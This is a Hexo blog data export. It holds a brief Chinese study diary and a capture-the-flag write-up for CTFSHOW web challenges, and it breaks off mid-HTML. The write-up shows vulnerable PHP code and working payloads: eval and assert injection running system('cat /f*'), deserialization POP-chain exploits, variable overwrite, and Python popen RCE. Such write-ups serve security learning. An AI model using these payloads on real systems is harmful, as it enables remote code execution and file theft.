学习时间\n\n- 2h3min\n\n\n\n## MATH\n\n- 第八讲过完\n\n  \n\n## ENGLISH\n\n- 也许30个？\n\n\n\n## 408\n\n- 没看。。。\n\n\n\n## 杂记\n\n今天基本上一天都在重构博客\n\n将halo换成hexo的了，感觉keep主题是真的好看！\n\n今天看文档看的头皮发麻，勉强弄了一点\n\n感觉还挺好看的？😄\n\n![2445159348](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png)","slug":"2024_4_12","published":1,"updated":"2024-04-12T16:54:24.925Z","_id":"cluwwqqls0000or76h8bj9jme","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-4-12\"><a href=\"#2024-4-12\" class=\"headerlink\" title=\"2024 4 12\"></a>2024 4 12</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>2h3min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第八讲过完</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>也许30个？</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>没看。。。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天基本上一天都在重构博客</p>\n<p>将halo换成hexo的了，感觉keep主题是真的好看！</p>\n<p>今天看文档看的头皮发麻，勉强弄了一点</p>\n<p>感觉还挺好看的？😄</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png\"\n                        alt=\"2445159348\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-12\"><a href=\"#2024-4-12\" class=\"headerlink\" title=\"2024 4 12\"></a>2024 4 12</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>2h3min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第八讲过完</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>也许30个？</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>没看。。。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天基本上一天都在重构博客</p>\n<p>将halo换成hexo的了，感觉keep主题是真的好看！</p>\n<p>今天看文档看的头皮发麻，勉强弄了一点</p>\n<p>感觉还挺好看的？😄</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png\"\n                        alt=\"2445159348\"\n                 ></p>\n"},{"title":"CTFSHOW_菜狗杯","date":"2022-10-21T15:20:17.000Z","excerpt":"CTFSHOW_菜狗杯","_content":"\n# CTFSHOW_菜狗杯\n\n\n\n\n\n## web签到\n\n\n\n\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\neval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);\n```\n\n一个看似很绕的代码，我们一层一层的看：\n\n**$_COOKIE['CTFshow-QQ群:']**\n\n我们将**cookie**里的**CTFshow-QQ群:**的值设置为a，\n\n现在内容就是\n\n```\n$_REQUEST[$_GET[$_POST[a]]]\n```\n\n然后接着是post方式传入a=b\n\n```\n$_REQUEST[$_GET[b]]\n```\n\n然后用get方式传入b=c\n\n```\n$_REQUEST[c][6][0][7][5][8][0][9][4][4]);\n```\n\nREQUEST我们既可以用get方式也可以用post方式\n\n```\nc[6][0][7][5][8][0][9][4][4]=system('cat /f*');\n```\n\n这里要注意cookie中的**<u>CTFshow-QQ群:</u>**含有中文字符\n\n我们要将中文字符进行url解码\n\n```\nCTFshow-QQ%E7%BE%A4:=a\n```\n\n\n\n\n\n\n\n## web2 c0me_t0_s1gn  \n\nF12\n\n![图片-1680664313075](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png)\n\n提示说去控制台\n\n```\ntry to run the function \"g1ve_flag()\" to get the flag!\n```\n\n![图片-1680664326857](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png)\n\n\n\n\n\n\n\n## 我的眼里只有$\n\n```php\n<?php\n\nerror_reporting(0);\nextract($_POST);\neval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);\nhighlight_file(__FILE__);\n```\n\n变量嵌套问题，先给$_赋值：$__=a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下\n\n```python\nimport string\ns = string.ascii_letters \nt='_=a&'\ncode=\"phpinfo();\"\nfor i in range(35):\n    t+=s[i]+\"=\"+s[i+1]+'&'\n\nt+=s[i]+'='+code\nprint(t)\n\n```\n\npayload\n\n```\n_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=J&I=system('cat /f*');\n```\n\n\n\n\n\n\n\n## 一言既出\n\n```\n <?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n    if ($_GET['num'] == 114514){\n        assert(\"intval($_GET[num])==1919810\") or die(\"一言既出，驷马难追!\");\n        echo $flag;\n    } \n} \n\n```\n\n> assert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号\n\npayload\n\n```\n?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）\n\n?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810\n\n?num=114514);1919810    跟第一种方法类似\n```\n\n\n\n\n\n\n\n## 驷马难追            \n\n```php\n<?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n     if ($_GET['num'] == 114514 && check($_GET['num'])){\n              assert(\"intval($_GET[num])==1919810\") or die(\"一言既出，驷马难追!\");\n              echo $flag;\n     } \n} \n\nfunction check($str){\n  return !preg_match(\"/[a-z]|\\;|\\(|\\)/\",$str);\n\n```\n\n相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过\n\n\n\npayload\n\n```\n?num=114514%2b1805296\n```\n\n\n\n\n\n\n\n## TapTapTap\n\nF12控制台求值，flag在\n\n```\n/secret_path_you_do_not_know/secretfile.txt\n```\n\n\n\n\n\n\n\n## webshell\n\n```php\n <?php \n    error_reporting(0);\n\n    class Webshell {\n        public $cmd = 'echo \"Hello World!\"';\n\n        public function __construct() {\n            $this->init();\n        }\n\n        public function init() {\n            if (!preg_match('/flag/i', $this->cmd)) {\n                $this->exec($this->cmd);\n            }\n        }\n\n        public function exec($cmd) {\n            $result = shell_exec($cmd);\n            echo $result;\n        }\n    }\n\n    if(isset($_GET['cmd'])) {\n        $serializecmd = $_GET['cmd'];\n        $unserializecmd = unserialize($serializecmd);\n        $unserializecmd->init();\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n\n?> \n```\n\n一到简单的反序列化题目\n\n目标点在webshell类上的init函数，反序列化后直接执行。。。\n\n\n\nexp\n\n```php\n <?php \n class Webshell {\n \n        public $cmd = 'cat f*';\n        \n}  \necho serialize(new Webshell);\n?> \n// O:8:\"Webshell\":1:{s:3:\"cmd\";s:6:\"cat f*\";} \n```\n\n\n\n\n\n\n\n## 化零为整            \n\n```\n <?php\n\nhighlight_file(__FILE__);\ninclude \"flag.php\";\n\n$result='';\n\nfor ($i=1;$i<=count($_GET);$i++){\n    if (strlen($_GET[$i])>1){\n        die(\"你太长了！！\");\n        }\n    else{\n    $result=$result.$_GET[$i];\n    }\n}\n\nif ($result ===\"大牛\"){\n    echo $flag;\n}\n\n```\n\n中文在php里面长度是3，其实很容易想到中文的url编码就是3个\n\n我们将大牛进行url编码\n\n```\n%E5%A4%A7%E7%89%9B\n```\n\n\n\npayload\n\n```\n/?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B\n```\n\n\n\n\n\n\n\n## 无一幸免\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nif (isset($_GET['0'])){\n    $arr[$_GET['0']]=1;\n    if ($arr[]=1){\n        die($flag);\n    }\n    else{\n        die(\"nonono!\");\n    }\n}\n\n```\n\n代码部分7，8行条件判断，这里$arr[]=1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。\n\n\n\npayload\n\n```\n?0=0\n```\n\n\n\n\n\n\n\n## 传说之下（雾）            \n\n```\nvar nowScore = this.score += 1\n```\n\njs代码中第275行，将这个改为\n\n```\nvar nowScore = this.score += 2077\n```\n\n\n\n\n\n## 算力超群            \n\n抓个包先\n\n```\nGET /_calculate?number1=5&operator=*&number2=6 HTTP/1.1\n```\n\n传递了3个参数，我们分别对这个三个参数污染一下\n\n发现number1,operator都有过滤，对number2时直接报错了\n\n直接对number2 RCE\n\n\n\npayload\n\n```\n/_calculate?number1=5&operator=*&number2=__import__('os').popen('cat /f*').read()\n```\n\n\n\n\n\n\n\n## 遍地飘零\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\n$zeros=\"000000000000000000000000000000\";\n\nforeach($_GET as $key => $value){\n    $$key=$$value;\n}\n\nif ($flag==\"000000000000000000000000000000\"){\n    echo \"好多零\";\n}else{\n    echo \"没有零，仔细看看输入有什么问题吧\";\n    var_dump($_GET);\n}\n\n```\n\n本题考察的是变量覆盖\n\n我们传入?_GET=flag\n\n```\nvar_dump($_GET);=>  var_dump($flag);\n```\n\n\n\n\n\n## 茶歇区\n\n抓包\n\n没怎么搞懂，看wp说是php整数溢出，\n\n\n\npayload\n\n```\na=0&b=0&c=0&d=0&e=999999999999999999&submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81\n```\n\n\n\n\n\n\n\n## 小舔田\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nclass Moon{\n    public $name=\"月亮\";\n    public function __toString(){\n        return $this->name;\n    }\n    \n    public function __wakeup(){\n        echo \"我是\".$this->name.\"快来赏我\";\n    }\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"牛夫人\";\n\n    public function call(){\n        global $flag;\n        if ($this->nickname==\"小甜甜\"){\n            echo $flag;\n        }else{\n            echo \"以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家\".$this->nickname.\"。\\n\";\n            echo \"你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n\";\n        }\n    }\n    \n    public function __toString(){\n        $this->call();\n        return \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----\".$this->nickname;\n    }\n}\n\nif (isset($_GET['code'])){\n    unserialize($_GET['code']);\n\n}else{\n    $a=new Ion_Fan_Princess();\n    echo $a;\n}\n\n```\n\n在Ion_Fan_Princess类下的 call函数可以 echo $flag\n\nIon_Fan_Princess类的__toString可以出发call函数\n\nMoon类 下的 __wakeup可以触发 ____toString\n\n\n\npop链\n\n```\nMoon::__wakeup => Ion_Fan_Princess::__toString => Ion_Fan_Princess::call\n```\n\n\n\nexp\n\n```\n <?php\nclass Moon{\n    public $name;\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"小甜甜\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n//  <?php\nclass Moon{\n    public $name;\n    \n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"小甜甜\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n// O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"小甜甜\";}}\n```\n\n\n\npayload\n\n```\n?code=O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"小甜甜\";}}\n```","source":"_posts/CTFSHOW_菜狗杯.md","raw":"---\ntitle: CTFSHOW_菜狗杯\ndate: 2022-10-21 23:20:17\nexcerpt: CTFSHOW_菜狗杯\ncategories: 复现\n---\n\n# CTFSHOW_菜狗杯\n\n\n\n\n\n## web签到\n\n\n\n\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\neval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);\n```\n\n一个看似很绕的代码，我们一层一层的看：\n\n**$_COOKIE['CTFshow-QQ群:']**\n\n我们将**cookie**里的**CTFshow-QQ群:**的值设置为a，\n\n现在内容就是\n\n```\n$_REQUEST[$_GET[$_POST[a]]]\n```\n\n然后接着是post方式传入a=b\n\n```\n$_REQUEST[$_GET[b]]\n```\n\n然后用get方式传入b=c\n\n```\n$_REQUEST[c][6][0][7][5][8][0][9][4][4]);\n```\n\nREQUEST我们既可以用get方式也可以用post方式\n\n```\nc[6][0][7][5][8][0][9][4][4]=system('cat /f*');\n```\n\n这里要注意cookie中的**<u>CTFshow-QQ群:</u>**含有中文字符\n\n我们要将中文字符进行url解码\n\n```\nCTFshow-QQ%E7%BE%A4:=a\n```\n\n\n\n\n\n\n\n## web2 c0me_t0_s1gn  \n\nF12\n\n![图片-1680664313075](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png)\n\n提示说去控制台\n\n```\ntry to run the function \"g1ve_flag()\" to get the flag!\n```\n\n![图片-1680664326857](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png)\n\n\n\n\n\n\n\n## 我的眼里只有$\n\n```php\n<?php\n\nerror_reporting(0);\nextract($_POST);\neval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);\nhighlight_file(__FILE__);\n```\n\n变量嵌套问题，先给$_赋值：$__=a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下\n\n```python\nimport string\ns = string.ascii_letters \nt='_=a&'\ncode=\"phpinfo();\"\nfor i in range(35):\n    t+=s[i]+\"=\"+s[i+1]+'&'\n\nt+=s[i]+'='+code\nprint(t)\n\n```\n\npayload\n\n```\n_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=J&I=system('cat /f*');\n```\n\n\n\n\n\n\n\n## 一言既出\n\n```\n <?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n    if ($_GET['num'] == 114514){\n        assert(\"intval($_GET[num])==1919810\") or die(\"一言既出，驷马难追!\");\n        echo $flag;\n    } \n} \n\n```\n\n> assert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号\n\npayload\n\n```\n?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）\n\n?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810\n\n?num=114514);1919810    跟第一种方法类似\n```\n\n\n\n\n\n\n\n## 驷马难追            \n\n```php\n<?php\nhighlight_file(__FILE__); \ninclude \"flag.php\";  \nif (isset($_GET['num'])){\n     if ($_GET['num'] == 114514 && check($_GET['num'])){\n              assert(\"intval($_GET[num])==1919810\") or die(\"一言既出，驷马难追!\");\n              echo $flag;\n     } \n} \n\nfunction check($str){\n  return !preg_match(\"/[a-z]|\\;|\\(|\\)/\",$str);\n\n```\n\n相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过\n\n\n\npayload\n\n```\n?num=114514%2b1805296\n```\n\n\n\n\n\n\n\n## TapTapTap\n\nF12控制台求值，flag在\n\n```\n/secret_path_you_do_not_know/secretfile.txt\n```\n\n\n\n\n\n\n\n## webshell\n\n```php\n <?php \n    error_reporting(0);\n\n    class Webshell {\n        public $cmd = 'echo \"Hello World!\"';\n\n        public function __construct() {\n            $this->init();\n        }\n\n        public function init() {\n            if (!preg_match('/flag/i', $this->cmd)) {\n                $this->exec($this->cmd);\n            }\n        }\n\n        public function exec($cmd) {\n            $result = shell_exec($cmd);\n            echo $result;\n        }\n    }\n\n    if(isset($_GET['cmd'])) {\n        $serializecmd = $_GET['cmd'];\n        $unserializecmd = unserialize($serializecmd);\n        $unserializecmd->init();\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n\n?> \n```\n\n一到简单的反序列化题目\n\n目标点在webshell类上的init函数，反序列化后直接执行。。。\n\n\n\nexp\n\n```php\n <?php \n class Webshell {\n \n        public $cmd = 'cat f*';\n        \n}  \necho serialize(new Webshell);\n?> \n// O:8:\"Webshell\":1:{s:3:\"cmd\";s:6:\"cat f*\";} \n```\n\n\n\n\n\n\n\n## 化零为整            \n\n```\n <?php\n\nhighlight_file(__FILE__);\ninclude \"flag.php\";\n\n$result='';\n\nfor ($i=1;$i<=count($_GET);$i++){\n    if (strlen($_GET[$i])>1){\n        die(\"你太长了！！\");\n        }\n    else{\n    $result=$result.$_GET[$i];\n    }\n}\n\nif ($result ===\"大牛\"){\n    echo $flag;\n}\n\n```\n\n中文在php里面长度是3，其实很容易想到中文的url编码就是3个\n\n我们将大牛进行url编码\n\n```\n%E5%A4%A7%E7%89%9B\n```\n\n\n\npayload\n\n```\n/?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B\n```\n\n\n\n\n\n\n\n## 无一幸免\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nif (isset($_GET['0'])){\n    $arr[$_GET['0']]=1;\n    if ($arr[]=1){\n        die($flag);\n    }\n    else{\n        die(\"nonono!\");\n    }\n}\n\n```\n\n代码部分7，8行条件判断，这里$arr[]=1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。\n\n\n\npayload\n\n```\n?0=0\n```\n\n\n\n\n\n\n\n## 传说之下（雾）            \n\n```\nvar nowScore = this.score += 1\n```\n\njs代码中第275行，将这个改为\n\n```\nvar nowScore = this.score += 2077\n```\n\n\n\n\n\n## 算力超群            \n\n抓个包先\n\n```\nGET /_calculate?number1=5&operator=*&number2=6 HTTP/1.1\n```\n\n传递了3个参数，我们分别对这个三个参数污染一下\n\n发现number1,operator都有过滤，对number2时直接报错了\n\n直接对number2 RCE\n\n\n\npayload\n\n```\n/_calculate?number1=5&operator=*&number2=__import__('os').popen('cat /f*').read()\n```\n\n\n\n\n\n\n\n## 遍地飘零\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\n$zeros=\"000000000000000000000000000000\";\n\nforeach($_GET as $key => $value){\n    $$key=$$value;\n}\n\nif ($flag==\"000000000000000000000000000000\"){\n    echo \"好多零\";\n}else{\n    echo \"没有零，仔细看看输入有什么问题吧\";\n    var_dump($_GET);\n}\n\n```\n\n本题考察的是变量覆盖\n\n我们传入?_GET=flag\n\n```\nvar_dump($_GET);=>  var_dump($flag);\n```\n\n\n\n\n\n## 茶歇区\n\n抓包\n\n没怎么搞懂，看wp说是php整数溢出，\n\n\n\npayload\n\n```\na=0&b=0&c=0&d=0&e=999999999999999999&submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81\n```\n\n\n\n\n\n\n\n## 小舔田\n\n```\n <?php\ninclude \"flag.php\";\nhighlight_file(__FILE__);\n\nclass Moon{\n    public $name=\"月亮\";\n    public function __toString(){\n        return $this->name;\n    }\n    \n    public function __wakeup(){\n        echo \"我是\".$this->name.\"快来赏我\";\n    }\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"牛夫人\";\n\n    public function call(){\n        global $flag;\n        if ($this->nickname==\"小甜甜\"){\n            echo $flag;\n        }else{\n            echo \"以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家\".$this->nickname.\"。\\n\";\n            echo \"你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n\";\n        }\n    }\n    \n    public function __toString(){\n        $this->call();\n        return \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----\".$this->nickname;\n    }\n}\n\nif (isset($_GET['code'])){\n    unserialize($_GET['code']);\n\n}else{\n    $a=new Ion_Fan_Princess();\n    echo $a;\n}\n\n```\n\n在Ion_Fan_Princess类下的 call函数可以 echo $flag\n\nIon_Fan_Princess类的__toString可以出发call函数\n\nMoon类 下的 __wakeup可以触发 ____toString\n\n\n\npop链\n\n```\nMoon::__wakeup => Ion_Fan_Princess::__toString => Ion_Fan_Princess::call\n```\n\n\n\nexp\n\n```\n <?php\nclass Moon{\n    public $name;\n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"小甜甜\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n//  <?php\nclass Moon{\n    public $name;\n    \n}\n\nclass Ion_Fan_Princess{\n    public $nickname=\"小甜甜\";\n    \n}\n$a=new Moon;\n$b=new Ion_Fan_Princess;\n$a->name=$b;\n\necho serialize($a);\n// O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"小甜甜\";}}\n```\n\n\n\npayload\n\n```\n?code=O:4:\"Moon\":1:{s:4:\"name\";O:16:\"Ion_Fan_Princess\":1:{s:8:\"nickname\";s:9:\"小甜甜\";}}\n```","slug":"CTFSHOW_菜狗杯","published":1,"updated":"2024-04-17T08:43:00.139Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7hk0000h7761sb1h8gg","content":"<h1 id=\"CTFSHOW-菜狗杯\"><a href=\"#CTFSHOW-菜狗杯\" class=\"headerlink\" title=\"CTFSHOW_菜狗杯\"></a>CTFSHOW_菜狗杯</h1><h2 id=\"web签到\"><a href=\"#web签到\" class=\"headerlink\" title=\"web签到\"></a>web签到</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"variable\">$_GET</span>[<span class=\"variable\">$_POST</span>[<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class=\"number\">6</span>][<span class=\"number\">0</span>][<span class=\"number\">7</span>][<span class=\"number\">5</span>][<span class=\"number\">8</span>][<span class=\"number\">0</span>][<span class=\"number\">9</span>][<span class=\"number\">4</span>][<span class=\"number\">4</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>一个看似很绕的代码，我们一层一层的看：</p>\n<p><strong>$_COOKIE[‘CTFshow-QQ群:’]</strong></p>\n<p>我们将<strong>cookie</strong>里的**CTFshow-QQ群:**的值设置为a，</p>\n<p>现在内容就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[$_POST[a]]]</span><br></pre></td></tr></table></figure>\n\n<p>然后接着是post方式传入a&#x3D;b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[b]]</span><br></pre></td></tr></table></figure>\n\n<p>然后用get方式传入b&#x3D;c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[c][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>\n\n<p>REQUEST我们既可以用get方式也可以用post方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>这里要注意cookie中的**<u>CTFshow-QQ群:</u>**含有中文字符</p>\n<p>我们要将中文字符进行url解码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CTFshow-QQ%E7%BE%A4:=a</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"web2-c0me-t0-s1gn\"><a href=\"#web2-c0me-t0-s1gn\" class=\"headerlink\" title=\"web2 c0me_t0_s1gn\"></a>web2 c0me_t0_s1gn</h2><p>F12</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png\"\n                        alt=\"图片-1680664313075\"\n                 ></p>\n<p>提示说去控制台</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try to run the function &quot;g1ve_flag()&quot; to get the flag!</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png\"\n                        alt=\"图片-1680664326857\"\n                 ></p>\n<h2 id=\"我的眼里只有\"><a href=\"#我的眼里只有\" class=\"headerlink\" title=\"我的眼里只有$\"></a>我的眼里只有$</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>变量嵌套问题，先给$_赋值：$__&#x3D;a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">s = string.ascii_letters </span><br><span class=\"line\">t=<span class=\"string\">&#x27;_=a&amp;&#x27;</span></span><br><span class=\"line\">code=<span class=\"string\">&quot;phpinfo();&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span 